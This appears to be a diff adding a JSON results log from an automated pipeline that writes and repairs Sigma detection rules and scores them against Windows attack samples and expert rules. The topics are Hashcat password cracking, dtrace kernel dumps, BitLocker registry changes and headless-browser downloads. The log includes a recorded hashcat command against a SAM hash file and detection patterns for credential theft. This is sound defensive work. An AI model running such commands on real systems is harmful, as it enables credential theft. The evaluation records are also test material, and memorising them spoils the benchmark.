+        "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 8.88
+     },
+     "tokens": 1755,
+     "latency_s": 5.83,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "title: Potential Hashcat Password Cracking Activity\nid: 0a69dd5f-5e33-4a32-870f-ef00e7a07c08\nstatus: experimental\ndescription: Detects execution of Hashcat.exe with command line arguments referencing a SAM file and a password list, indicative\n  of credential access via password cracking.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.credential-access\n- attack.t1110.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: \\\\Hashcat.exe\n  selection_sam:\n    CommandLine|contains:\n    - SAM file\n    - sam.txt\n  selection_pass:\n    CommandLine|contains:\n    - Password list\n    - -a 0\n  condition: selection_img and selection_sam and selection_pass\nfalsepositives:\n- Legitimate administrative use of Hashcat for password recovery in authorized penetration testing should be considered.\nlevel: high\n",
+     "sha256": "75221c53606bed81aaf3227f3dd5352432f2e7b2481ae0bcbe891f25a060003c",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "39b31e81-5f5f-4898-9c0e-2160cfc0f9bf.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+        "UtcTime": "2026-08-09 08:34:31.379",
+        "ProcessGuid": "{570e49aa-3b97-6a78-0a0c-000000001400}",
+        "ProcessId": "8700",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "FileVersion": "10.0.26100.8737 (WinBuild.160101.0800)",
+        "Description": "Windows Command Processor",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "Cmd.Exe",
+        "CommandLine": "\"cmd.exe\" /c cd C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. & C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule C:\\AtomicRedTeam\\atomics\\T1110.002\\src\\sam.txt C:\\AtomicRedTeam\\atomics...",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-c366-6a76-1edd-080000000000}",
+        "LogonId": "0x000000000008dd1e",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=6142A8457F497ABC4B102D75F549F76A9E3577C7,MD5=1F4D18374A699452622E80F6D5BB743E,SHA256=65EC268ADD3973B6DCA64222985DA47CAEAEE44A340B0EC1466782914FD743D9,IMPHASH=010B165E4C37F484601D3DBD700C9423",
+        "ParentProcessGuid": "{570e49aa-3103-6a78-c408-000000001400}",
+        "ParentProcessId": "4276",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 12.5
+     },
+     "tokens": 3649,
+     "latency_s": 13.34,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Potential Hashcat Password Cracking Activity\",\n \"description\": \"Detects execution of Hashcat.exe with command line arguments referencing a SAM file and a password list, indicative of credential access via password cracking.\",\n \"tags\": [\n  \"attack.credential-access\",\n  \"attack.t1110.002\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [],\n \"condition\": \"\",\n \"falsepositives\": [\n  \"Legitimate administrative use of Hashcat for password recovery in authorized penetration testing should be considered.\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "d06c497454c700f1e1b84ccd455884c87b90be1722f4f8d6aa4743121484ea5e",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no condition"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 11070,
+     "latency_s": 28.94,
+     "evaluator_error": null,
+     "resamples": 3
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "title: Potential Hashcat Password Cracking Activity\nid: 0a69dd5f-5e33-4a32-870f-ef00e7a07c08\nstatus: experimental\ndescription: Detects execution of Hashcat.exe with command line arguments referencing a SAM file and a password list, indicative\n  of credential access via password cracking.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.credential-access\n- attack.t1110.002\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\\\hashcat.exe\n    CommandLine|contains|all:\n    - .sam\n    - .txt\n  condition: selection\nfalsepositives:\n- Legitimate administrative use of Hashcat for password recovery in authorized penetration testing should be considered.\nlevel: high\n",
+     "sha256": "930663e4c5142534882fed58ffdfdfaef1f283d2f6ce65e075bf49906a5f0bec",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 0,
+      "attack_missed": [
+       "39b31e81-5f5f-4898-9c0e-2160cfc0f9bf.evtx"
+      ],
+      "attack_events_hit": 0,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [
+       {
+        "EventID": 1,
+        "Channel": "Microsoft-Windows-Sysmon/Operational",
+        "RuleName": "technique_id=T1083,technique_name=File and Directory Discovery",
+        "UtcTime": "2026-08-09 08:34:31.379",
+        "ProcessGuid": "{570e49aa-3b97-6a78-0a0c-000000001400}",
+        "ProcessId": "8700",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "FileVersion": "10.0.26100.8737 (WinBuild.160101.0800)",
+        "Description": "Windows Command Processor",
+        "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+        "Company": "Microsoft Corporation",
+        "OriginalFileName": "Cmd.Exe",
+        "CommandLine": "\"cmd.exe\" /c cd C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. & C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule C:\\AtomicRedTeam\\atomics\\T1110.002\\src\\sam.txt C:\\AtomicRedTeam\\atomics...",
+        "CurrentDirectory": "C:\\Users\\frack113\\AppData\\Local\\Temp\\",
+        "User": "SigmaCatchVm\\frack113",
+        "LogonGuid": "{570e49aa-c366-6a76-1edd-080000000000}",
+        "LogonId": "0x000000000008dd1e",
+        "TerminalSessionId": "1",
+        "IntegrityLevel": "High",
+        "Hashes": "SHA1=6142A8457F497ABC4B102D75F549F76A9E3577C7,MD5=1F4D18374A699452622E80F6D5BB743E,SHA256=65EC268ADD3973B6DCA64222985DA47CAEAEE44A340B0EC1466782914FD743D9,IMPHASH=010B165E4C37F484601D3DBD700C9423",
+        "ParentProcessGuid": "{570e49aa-3103-6a78-c408-000000001400}",
+        "ParentProcessId": "4276",
+        "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
+        "ParentUser": "SigmaCatchVm\\frack113"
+       }
+      ],
+      "seconds": 10.39
+     },
+     "tokens": 1321,
+     "latency_s": 5.22,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 10.0
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: HackTool - Hashcat Password Cracker Execution\nid: 39b31e81-5f5f-4898-9c0e-2160cfc0f9bf\nstatus: test\ndescription: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat\n    - https://hashcat.net/wiki/doku.php?id=hashcat\nauthor: frack113\ndate: 2021-12-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1110.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\hashcat.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-a '\n            - '-m 1000 '\n            - '-r '\n    condition: 1 of selection_*\nfalsepositives:\n    - Tools that use similar command line flags and values\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_hktl_hashcat/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "7124aebe-4cd7-4ccb-8df0-6d6b93c96795",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_dtrace_kernel_dump.yml",
+    "title": "Suspicious Kernel Dump Using Dtrace",
+    "category": "process_creation",
+    "date": "2021-12-28",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_dtrace_kernel_dump/7124aebe-4cd7-4ccb-8df0-6d6b93c96795.evtx",
+    "sample_sha256": "18bac286b246c2bbb2c3f4ebdf80dae43de05e5f811712c37bbbeacf8ff31d66"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [],
+    "techniques": [
+     {
+      "id": "T1082",
+      "quote": "ATT&CK tags: attack.discovery, attack.t1082"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\\\dtrace.exe",
+      "quote": "using dtrace.exe"
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Suspicious Kernel Dump Using Dtrace\nid: f4a0a73d-ec1e-4d10-a487-2793f2a67b1a\nstatus: experimental\ndescription: Detects suspicious usage of dtrace.exe to dump kernel memory on Windows.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.discovery\n- attack.t1082\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\dtrace.exe\n    CommandLine|contains: -n\n  condition: selection\nfalsepositives:\n- Unknown\nlevel: high\n",
+     "sha256": "32cca200df56987343334a22b5dbdb49f5eae1339304f2aa91b886961ae75f13",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 9.86
+     },
+     "tokens": 1133,
+     "latency_s": 4.69,
+     "evaluator_error": null,
+     "resamples": 0
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 2,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 13.89
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Suspicious Kernel Dump Using Dtrace\nid: 7124aebe-4cd7-4ccb-8df0-6d6b93c96795\nstatus: test\ndescription: Detects suspicious way to dump the kernel on Windows systems using dtrace.exe, which is available on Windows systems since Windows 10 19H1\nreferences:\n    - https://twitter.com/0gtweet/status/1474899714290208777?s=12\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/dtrace\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-12-28\ntags:\n    - attack.discovery\n    - attack.t1082\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_plain:\n        Image|endswith: '\\dtrace.exe'\n        CommandLine|contains: 'lkd(0)'\n    selection_obfuscated:\n        CommandLine|contains|all:\n            - 'syscall:::return'\n            - 'lkd('\n    condition: 1 of selection*\nfalsepositives:\n    - Unknown\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_dtrace_kernel_dump/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "0e0255bf-2548-47b8-9582-c0955c9283f5",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_reg_bitlocker.yml",
+    "title": "Suspicious Reg Add BitLocker",
+    "category": "process_creation",
+    "date": "2021-11-15",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_reg_bitlocker/0e0255bf-2548-47b8-9582-c0955c9283f5.evtx",
+    "sample_sha256": "ce3f055305ff3833042826665084dcd5de048821691b66a0e5b009aca83705b2"
+   },
+   "spec": {
+    "behavior": "",
+    "logsource_category": "process_creation",
+    "observables": [
+     {
+      "field": "TargetObject",
+      "match": "contains",
+      "value": "BitLocker",
+      "quote": "addition to BitLocker related registry keys"
+     }
+    ],
+    "techniques": [
+     {
+      "id": "T1486",
+      "quote": "attack.t1486"
+     }
+    ]
+   },
+   "spec_dropped": [
+    {
+     "kind": "observable",
+     "item": {
+      "field": "Image",
+      "match": "endswith",
+      "value": "\\reg.exe",
+      "quote": "via the reg.exe utility"
+     },
+     "reason": "value not contained in its quote"
+    }
+   ],
+   "success": false,
+   "stop_reason": "repair budget exhausted",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Suspicious Reg Add to BitLocker Registry Keys\nid: ac08743d-4e3e-4a55-9f67-931efda79cbb\nstatus: experimental\ndescription: Detects usage of reg.exe to add values under BitLocker related registry keys, indicative of ransomware activity\n  disabling BitLocker protection.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.t1486\n- attack.impact\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \\reg.exe\n    CommandLine|re: (?=.*BitLocker)(?=.*add)\n  condition: selection\nfalsepositives:\n- Legitimate administrative scripts that modify BitLocker policies via reg.exe\nlevel: high\n",
+     "sha256": "12818e618c23ed6c9098ee4760599f8e03c944cd9524bc38562dc01094059fc5",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": null,
+     "tokens": 4012,
+     "latency_s": 24.59,
+     "evaluator_error": "checker exited 1: could not add rules from /work/rules/r0000.yml: syntax error in selection element of rule Suspicious Reg Add to BitLocker Registry Keys: error parsing regexp: invalid or unsupported Perl syntax: `(?=`",
+     "resamples": 1
+    },
+    {
+     "index": 1,
+     "action": "repair",
+     "rule_text": "title: Suspicious Reg Add to BitLocker Registry Keys\nid: ac08743d-4e3e-4a55-9f67-931efda79cbb\nstatus: experimental\ndescription: Detects usage of reg.exe to add values under BitLocker related registry keys, indicative of ransomware activity\\ndisabling\n  BitLocker protection.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.t1486\n- attack.impact\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith|endswith: \\\\reg.exe\n    CommandLine|re|re: .*BitLocker.*add|.*add.*BitLocker\n  condition: selection\nfalsepositives:\n- Legitimate administrative scripts that modify BitLocker policies via reg.exe\nlevel: high\n",
+     "sha256": "b13f36611b4cacaa109c936c45cefb68ea41f5207332a929268a2434e8907008",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "sigma check failed"
+      ],
+      "sigma_output": "=== Sigma Rule Errors ===\nModifier SigmaRegularExpressionModifier incompatible to value type of 'SigmaRegularExpression(regexp=SigmaString(['.', <SpecialChars.WILDCARD_MULTI: 1>, 'BitLocker.', <SpecialChars.WILDCARD_MULTI: 1>, 'add|.', <SpecialChars.WILDCARD_MULTI: 1>, 'add.', <SpecialChars.WILDCARD_MULTI: 1>, 'BitLocker']), flags=set())' in <tmp>\\proc_creation_win_shakedown_candidate.yml\n\n=== Summary ===\nFound 1 errors, 0 condition errors and 0 issues.\n\nRule error summary:\n+-------+----------------+\n| Count | Rule Error     |\n+-------+----------------+\n| 1     | SigmaTypeError |\n+-------+----------------+\nNo condition errors found.\nNo validation issues found.\nCheck failure\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": null,
+     "tokens": 4032,
+     "latency_s": 14.55,
+     "evaluator_error": null,
+     "resamples": 2
+    },
+    {
+     "index": 2,
+     "action": "repair",
+     "rule_text": "title: Suspicious Reg Add to BitLocker Registry Keys\nid: ac08743d-4e3e-4a55-9f67-931efda79cbb\nstatus: experimental\ndescription: Detects usage of reg.exe to add values under BitLocker related registry keys, indicative of ransomware activity\\ndisabling\n  BitLocker protection.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.t1486\n- attack.impact\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith|endswith: \\\\reg.exe\n    CommandLine|re|re: (?i).*BitLocker.*add|(?i).*add.*BitLocker\n  condition: selection\nfalsepositives:\n- Legitimate administrative scripts that modify BitLocker policies via reg.exe\nlevel: high\n",
+     "sha256": "c7aa1b993f1646525e9905cf0cb12531b3f4d7a40ea7ef5256d0e1e8ed06dcd6",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "sigma check failed"
+      ],
+      "sigma_output": "=== Sigma Rule Errors ===\nRegular expression '(?i).*BitLocker.*add|(?i).*add.*BitLocker' is invalid: global flags not at the start of the expression at position 21\n\n=== Summary ===\nFound 1 errors, 0 condition errors and 0 issues.\n\nRule error summary:\n+-------+-----------------------------+\n| Count | Rule Error                  |\n+-------+-----------------------------+\n| 1     | SigmaRegularExpressionError |\n+-------+-----------------------------+\nNo condition errors found.\nNo validation issues found.\nCheck failure\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": null,
+     "tokens": 2026,
+     "latency_s": 8.12,
+     "evaluator_error": null,
+     "resamples": 0
+    },
+    {
+     "index": 3,
+     "action": "repair",
+     "rule_text": "{\n \"title\": \"Suspicious Reg Add to BitLocker Registry Keys\",\n \"description\": \"Detects usage of reg.exe to add values under BitLocker related registry keys, indicative of ransomware activity\\\\ndisabling BitLocker protection.\",\n \"tags\": [\n  \"attack.t1486\",\n  \"attack.impact\"\n ],\n \"logsource_category\": \"process_creation\",\n \"groups\": [],\n \"condition\": \"\",\n \"falsepositives\": [\n  \"Legitimate administrative scripts that modify BitLocker policies via reg.exe\"\n ],\n \"level\": \"high\"\n}",
+     "sha256": "6cdd4ff0c6ec5864e319b9568647f67885df046007a97b5a9795e7fb9be5a37c",
+     "validation": {
+      "ok": false,
+      "errors": [
+       "rule could not be built: rule has no condition"
+      ],
+      "sigma_output": ""
+     },
+     "evaluation": null,
+     "tokens": 5703,
+     "latency_s": 19.45,
+     "evaluator_error": null,
+     "resamples": 3
+    }
+   ],
+   "oneshot_heldout": null,
+   "best_heldout": null,
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 14.97
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: Suspicious Reg Add BitLocker\nid: 0e0255bf-2548-47b8-9582-c0955c9283f5\nstatus: test\ndescription: Detects suspicious addition to BitLocker related registry keys via the reg.exe utility\nreferences:\n    - https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/\nauthor: frack113\ndate: 2021-11-15\nmodified: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1486\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'REG'\n            - 'ADD'\n            - '\\SOFTWARE\\Policies\\Microsoft\\FVE'\n            - '/v'\n            - '/f'\n        CommandLine|contains:\n            - 'EnableBDEWithNoTPM'\n            - 'UseAdvancedStartup'\n            - 'UseTPM'\n            - 'UseTPMKey'\n            - 'UseTPMKeyPIN'\n            - 'RecoveryKeyMessageSource'\n            - 'UseTPMPIN'\n            - 'RecoveryKeyMessage'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_reg_bitlocker/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "0e8cfe08-02c9-4815-a2f8-0d157b7ed33e",
+    "rule_path": "rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download.yml",
+    "title": "File Download with Headless Browser",
+    "category": "process_creation",
+    "date": "2022-01-04",
+    "year_2026": false,
+    "sample": "regression_data/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download/0e8cfe08-02c9-4815-a2f8-0d157b7ed33e.evtx",
+    "sample_sha256": "547396199bb9121759db060f27396fe1e40b5529f6cf25cc676ac02bb7b0ab7f"
+   },
+   "spec": {
+    "behavior": "JSON only",
+    "logsource_category": "process_creation",
+    "observables": [
+     {
+      "field": "command_line",
+      "match": "contains",
+      "value": "chromium based browser",
+      "quote": "chromium based browser"
+     },
+     {
+      "field": "command_line",
+      "match": "contains",
+      "value": "headless mode",
+      "quote": "headless mode"
+     },
+     {
+      "field": "command_line",
+      "match": "contains",
+      "value": "\"dump-dom\"",
+      "quote": "\"dump-dom\""
+     },
+     {
+      "field": "url",
+      "match": "equals",
+      "value": "https://twitter.com/mrd0x/status/1478234484881436672?s=12",
+      "quote": "https://twitter.com/mrd0x/status/1478234484881436672?s=12"
+     },
+     {
+      "field": "url",
+      "match": "equals",
+      "value": "https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html",
+      "quote": "https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html"
+     }
+    ],
+    "techniques": [
+     {
+      "id": "T1105",
+      "quote": "attack.t1105"
+     },
+     {
+      "id": "T1564.003",
+      "quote": "attack.t1564.003"
+     }
+    ]
+   },
+   "spec_dropped": [],
+   "success": true,
+   "stop_reason": "acceptance criteria passed",
+   "best_index": 0,
+   "history": [
+    {
+     "index": 0,
+     "action": "generate",
+     "rule_text": "title: Chromium Based Browser Executed in Headless Mode With Dump-Dom\nid: 0cfd768d-9bff-4bab-89ef-61690cf81a5d\nstatus: experimental\ndescription: Detects execution of Chromium-based browsers (Chrome, Edge, Brave, Opera) launched in headless mode using the\n  dump-dom switch, indicative of file download activity.\nauthor: Shakedown\ndate: '2026-10-27'\ntags:\n- attack.t1105\n- attack.t1564.003\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  image_chromium:\n    Image|endswith:\n    - chrome.exe\n    - msedge.exe\n    - brave.exe\n    - opera.exe\n  cmd_headless:\n    CommandLine|contains: --headless\n  cmd_dumpdom:\n    CommandLine|contains: --dump-dom\n  condition: image_chromium and cmd_headless and cmd_dumpdom\nfalsepositives:\n- Unknown\nlevel: high\n",
+     "sha256": "55ad5c009260b33957a60d060cec9334a6ceff55d110cb8939645404a4477683",
+     "validation": {
+      "ok": true,
+      "errors": [],
+      "sigma_output": "\n=== Summary ===\nFound 0 errors, 0 condition errors and 0 issues.\nNo rule errors found.\nNo condition errors found.\nNo validation issues found.\nParsing Sigma rules\nChecking Sigma rules\n"
+     },
+     "evaluation": {
+      "attack_total": 1,
+      "attack_detected": 1,
+      "attack_missed": [],
+      "attack_events_hit": 1,
+      "benign": {
+       "benign_dev_win7": {
+        "files_total": 129,
+        "files_with_hits": 0,
+        "hits": 0,
+        "examples": []
+       }
+      },
+      "attack_events": [],
+      "seconds": 9.83
+     },
+     "tokens": 3716,
+     "latency_s": 10.02,
+     "evaluator_error": null,
+     "resamples": 1
+    }
+   ],
+   "oneshot_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "best_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_dev": {
+    "attack_total": 1,
+    "attack_detected": 1,
+    "attack_missed": [],
+    "attack_events_hit": 1,
+    "benign": {
+     "benign_dev_win7": {
+      "files_total": 129,
+      "files_with_hits": 0,
+      "hits": 0,
+      "examples": []
+     }
+    },
+    "attack_events": [],
+    "seconds": 10.86
+   },
+   "expert_heldout": {
+    "files_total": 352,
+    "files_with_hits": 0,
+    "hits": 0,
+    "examples": []
+   },
+   "expert_text": "title: File Download with Headless Browser\nid: 0e8cfe08-02c9-4815-a2f8-0d157b7ed33e\nrelated:\n    - id: ef9dcfed-690c-4c5d-a9d1-482cd422225c\n      type: derived\nstatus: test\ndescription: Detects execution of chromium based browser in headless mode using the \"dump-dom\" command line to download files\nreferences:\n    - https://twitter.com/mrd0x/status/1478234484881436672?s=12\n    - https://www.trendmicro.com/en_us/research/23/e/managed-xdr-investigation-of-ducktail-in-trend-micro-vision-one.html\nauthor: Sreeman, Florian Roth (Nextron Systems)\ndate: 2022-01-04\nmodified: 2025-10-07\ntags:\n    - attack.command-and-control\n    - attack.stealth\n    - attack.t1105\n    - attack.t1564.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\brave.exe'\n            - '\\chrome.exe'\n            - '\\msedge.exe'\n            - '\\opera.exe'\n            - '\\vivaldi.exe'\n        CommandLine|contains|all:\n            - '--headless'\n            - 'dump-dom'\n            - 'http'\n    filter_optional_edge_1:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\'\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeWebView\\'\n            - 'C:\\Program Files\\WindowsApps\\Microsoft.MicrosoftEdge'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n            - '\\MicrosoftEdge.exe'\n        CommandLine|contains: '--headless --disable-gpu --disable-extensions --disable-plugins --mute-audio --no-first-run --incognito --aggressive-cache-discard --dump-dom'\n    filter_optional_edge_2:\n        Image|contains:\n            - '\\AppData\\Local\\Microsoft\\WindowsApps\\'\n            - '\\Windows\\SystemApps\\Microsoft.MicrosoftEdge'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\MicrosoftEdge.exe'\n        CommandLine|contains: '--headless --disable-gpu --disable-extensions --disable-plugins --mute-audio --no-first-run --incognito --aggressive-cache-discard --dump-dom'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: high\nregression_tests_path: regression_data/rules/windows/process_creation/proc_creation_win_browsers_chromium_headless_file_download/info.yml\n"
+  },
+  {
+   "task": {
+    "rule_id": "e4b6d2a7-d8a4-4f19-acbd-943c16d90647",
+    "rule_path": "rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
+    "title": "Potentially Suspicious PowerShell Child Processes",
+    "category": "process_creation",
+    "date": "2022-04-26",
+    "year_2026": false,
+    "sample": "regression_data/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes/e4b6d2a7-d8a4-4f19-acbd-943c16d90647.evtx",
